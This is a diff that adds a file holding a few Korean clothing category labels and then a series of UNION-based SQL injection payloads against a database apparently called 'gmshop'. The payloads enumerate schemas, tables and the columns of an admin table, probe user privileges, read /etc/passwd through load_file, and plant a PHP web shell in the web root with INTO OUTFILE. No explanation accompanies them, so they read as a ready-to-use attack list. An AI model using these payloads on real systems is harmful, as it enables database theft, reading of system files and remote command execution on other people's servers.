@@ -1,0 +1,17 @@
+셔츠
+가을 아우터
+니트
+맨투맨
+모자
+
+
+1' union select 1,(select schema_name from information_schema.schemata limit 3,1),3,4,5,6,7;#
+1' union select 1,(select table_name from information_schema.tables where table_schema='gmshop' limit 1),(select table_name from information_schema.tables where table_schema='gmshop' limit 1,1),(select table_name from information_schema.tables where table_schema='gmshop' limit 2,1),(select table_name from information_schema.tables where table_schema='gmshop' limit 3,1),(select table_name from information_schema.tables where table_schema='gmshop' limit 4,1),7;#
+1' union select 1,(select column_name from information_schema.columns where table_schema='gmshop' and table_name='admin' limit 1),(select column_name from information_schema.columns where table_schema='gmshop' and table_name='admin' limit 1,1),(select column_name from information_schema.columns where table_schema='gmshop' and table_name='admin' limit 2,1),(select column_name from information_schema.columns where table_schema='gmshop' and table_name='admin' limit 3,1),(select column_name from information_schema.columns where table_schema='gmshop' and table_name='admin' limit 100,1),7;#
+1' union select 1,(select privilege_type from information_schema.user_privileges where grantee=quote(current_user())),3,4,5,6,7;#
+1' union select 1,(select grantee from information_schema.user_privileges where grantee=quote(current_user())),3,4,5,6,7;#
+1' union select 1,(select privilege from information_schema.user_privileges where grantee=quote(current_user())),3,4,5,6,7;#
+1' union select 1,2,3,null,null,null,null union select 4,5,6,null,null,null,null;#
+1' union select 1,load_file('/etc/passwd'),3,4,5,6,7;#
+0' union select 1, "<?php system($_GET['cmd']); ?>;",3,4,5,6,7 into outfile "/var/www/gm/hello.php";#
+
